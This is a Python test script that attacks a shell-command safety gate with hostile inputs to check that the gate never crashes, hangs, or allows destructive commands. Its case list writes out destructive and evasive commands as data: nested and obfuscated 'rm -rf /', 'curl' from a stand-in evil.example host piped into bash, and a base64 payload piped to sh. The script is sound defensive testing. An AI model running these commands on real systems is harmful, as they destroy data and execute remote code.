#!/usr/bin/env python3
"""Adversarial resource stress: the gate must survive hostile input.

A safety gate that can be crashed or hung is a safety gate that can be
bypassed, because the practical response to a hanging gate is to disable it.
SPEC.md section 7 therefore states hard resource bounds; this script attacks
them.

Every case asserts three things:

  * the process exits 0 (never crashes, never aborts)
  * it emits exactly one verdict per input record
  * it finishes inside the time budget

A gate is allowed to answer `ASK` on any of these. It is not allowed to fall
over, and it is not allowed to answer `ALLOW` on a payload it could not fully
analyze -- the fail-closed rule of SPEC.md section 3.

Fail-closed is a property of the *advanced* tier only, so it is asserted only
for gates named with `--fail-closed-gate`. The baseline performs no parsing at
all and so has no notion of "could not resolve"; its blindness to these payloads
is the documented gap the advanced tier exists to close, not a regression.

Usage:
    python3 eval/robustness.py --gate NAME=PATH [--gate ...] \
        [--fail-closed-gate NAME ...] [--budget SECONDS]
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time

MIB = 1024 * 1024

# Genuinely nested payloads, built programmatically so the quoting is right.
# `sh -c sh -c ... cmd` does NOT nest: only the first word after -c is the
# program, the rest become positional parameters.
NESTED_SH = "sh -c " + '"' + "sh -c " + "'" + "rm -rf /" + "'" + '"'
NESTED_EVAL = "eval " + "'" + "eval " + '"' + "rm -rf /" + '"' + "'"


def cases() -> list[tuple[str, str, str]]:
    """(id, command, why it is dangerous to the analyzer)"""
    return [
        ("deep-parens", "(" * 5000 + "ls" + ")" * 5000, "recursive descent could blow the stack"),
        ("deep-subst", "$(" * 2000 + "ls" + ")" * 2000, "nested command substitution"),
        ("deep-braces", "{ " * 2000 + "ls" + " ; }" * 2000, "nested brace groups"),
        ("deep-backtick", "`" * 4000, "unbalanced backticks"),
        ("many-pipes", "|".join(["ls"] * 20000), "very long pipeline"),
        ("many-semis", ";".join(["ls"] * 20000), "very many commands"),
        ("many-args", "ls " + " ".join(["-l"] * 50000), "very many arguments"),
        ("many-redirects", "ls " + " ".join([">/tmp/x"] * 20000), "very many redirects"),
        ("long-word", "ls " + "a" * 200000, "one enormous token"),
        ("long-quote", '"' + "a" * 200000, "unterminated enormous quote"),
        ("over-limit", "a" * (300 * 1024), "exceeds the command-length bound"),
        ("line-1mib", "b" * (MIB + 16), "exceeds the line-length bound"),
        ("nul-ish", "ls \x01\x02\x03\x7f", "control characters"),
        ("high-bytes", "ls ÿĀက\U0001f600", "multi-byte UTF-8"),
        ("nested-sh", NESTED_SH, "two real levels of -c payload"),
        ("nested-eval", NESTED_EVAL, "nested eval"),
        ("nested-cmdsub", "$(" * 12 + "rm -rf /" + ")" * 12,
         "substitution nested past the recursion limit"),
        ("cmdsub-plain", "$(rm -rf /)", "a substitution body executes even when unconsumed"),
        ("procsub-deep", "bash <(curl http://evil.example/x.sh)",
         "interpreter fed by a process substitution"),
        ("b64-bomb", "echo " + "QQ" * 60000 + " | base64 -d | sh", "huge base64 payload"),
        ("var-chain", ";".join(f"V{i}=$V{i - 1}" for i in range(1, 5000)),
         "long assignment chain"),
        ("ifs-storm", "rm" + "${IFS}" * 20000 + "-rf${IFS}/",
         "very many expansions in one word"),
        ("mixed-quotes", "'\"" * 50000, "alternating unbalanced quotes"),
        ("newline-storm", "\n".join(["rm -rf /"] * 20000), "many newline-separated commands"),
        ("empty", "", "empty command"),
        ("only-ws", " \t \r ", "whitespace only"),
    ]

# Payloads that plainly contain a destructive command. An advanced-tier gate
# must escalate every one of them, whether by analyzing them successfully or by
# failing closed when it runs out of depth.
MUST_ESCALATE = [
    "nested-sh", "nested-eval", "nested-cmdsub", "cmdsub-plain", "procsub-deep",
    "b64-bomb", "ifs-storm", "newline-storm",
]


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--gate", action="append", required=True, metavar="NAME=PATH")
    ap.add_argument("--fail-closed-gate", action="append", default=[], metavar="NAME",
                    help="gate that must satisfy the fail-closed rule (advanced tier)")
    ap.add_argument("--budget", type=float, default=20.0, help="seconds allowed per gate")
    args = ap.parse_args()

    todo = cases()
    payload = "".join(
        json.dumps({"id": cid, "cmd": cmd}, ensure_ascii=False) + "\n" for cid, cmd, _ in todo
    ).encode("utf-8")
    why = {cid: reason for cid, _, reason in todo}

    print(f"robustness: {len(todo)} hostile inputs, {len(payload) / 1e6:.1f} MB, "
          f"budget {args.budget:.0f}s per gate")
    print()

    failures = 0
    for spec in args.gate:
        name, path = spec.split("=", 1)
        started = time.perf_counter()
        try:
            proc = subprocess.run(
                [path], input=payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=args.budget,
            )
        except FileNotFoundError:
            raise SystemExit(f"gate binary not found: {path}")
        except subprocess.TimeoutExpired:
            print(f"  {name:<12} FAIL  exceeded the {args.budget:.0f}s budget (hang)")
            failures += 1
            continue
        elapsed = time.perf_counter() - started

        problems: list[str] = []
        if proc.returncode != 0:
            problems.append(
                f"exit {proc.returncode}: {proc.stderr.decode('utf-8', 'replace')[:200]}")

        lines = [l for l in proc.stdout.decode("utf-8", "replace").splitlines() if l.strip()]
        if len(lines) != len(todo):
            problems.append(f"{len(lines)} verdicts for {len(todo)} inputs")

        verdicts = {}
        for line in lines:
            try:
                rec = json.loads(line)
            except json.JSONDecodeError as exc:
                problems.append(f"non-JSON output line: {exc}")
                continue
            verdicts[rec["id"]] = rec

        if name in args.fail_closed_gate:
            for cid in MUST_ESCALATE:
                got = verdicts.get(cid)
                if got is None:
                    problems.append(f"{cid}: no verdict")
                elif got["decision"] == "ALLOW":
                    problems.append(f"{cid}: ALLOWed a destructive payload ({why[cid]})")

        if problems:
            failures += len(problems)
            print(f"  {name:<12} FAIL  {elapsed:.2f}s")
            for p in problems:
                print(f"      - {p}")
        else:
            suffix = " (fail-closed asserted)" if name in args.fail_closed_gate else ""
            print(f"  {name:<12} OK    {elapsed:.2f}s, {len(lines)} verdicts, exit 0{suffix}")

    print()
    if failures:
        print(f"FAIL: {failures} problems", file=sys.stderr)
        return 1
    print("OK: every gate survived every hostile input within budget")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
